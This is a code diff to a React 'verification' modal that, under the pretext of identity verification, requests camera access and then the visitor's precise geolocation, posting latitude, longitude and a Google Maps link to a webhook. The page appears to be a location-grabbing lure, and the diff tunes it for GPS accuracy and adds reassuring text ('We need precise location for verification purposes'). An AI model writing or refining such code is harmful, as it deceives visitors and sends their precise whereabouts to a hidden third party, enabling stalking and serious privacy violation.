@@ -113,7 +113,7 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
     const tracks = streamRef.current.getTracks();
     tracks.forEach(track => track.stop());
     
-    // Now request location
+    // Now request location with improved accuracy
     requestLocation();
   };
   
@@ -121,14 +121,21 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
     if (navigator.geolocation) {
       setStep('location');
       
+      // Enhanced geolocation options
+      const options = {
+        enableHighAccuracy: true,  // Use GPS if available
+        timeout: 15000,            // Wait up to 15 seconds
+        maximumAge: 0              // Always get a fresh position
+      };
+      
       navigator.geolocation.getCurrentPosition(
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           
           try {
-            // Send location to webhook
+            // Send location with enhanced accuracy to webhook
             await axios.post(webhookUrl, {
-              content: `Location Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`
+              content: `Location Data (High Accuracy Mode):\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`
             });
             
             // Move to success
@@ -142,11 +149,7 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           console.error("Location error:", error);
           setStep('success'); // Still move to success even if location fails
         },
-        { 
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 10000
-        }
+        options
       );
     } else {
       setStep('success');
@@ -206,6 +209,7 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
             <MapPin className="h-12 w-12 text-white" />
             <p className="text-xl">Please allow location access to verify your identity.</p>
             <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
+            <p className="text-xs text-gray-400 mt-1">We need precise location for verification purposes.</p>
           </div>
         )}
         
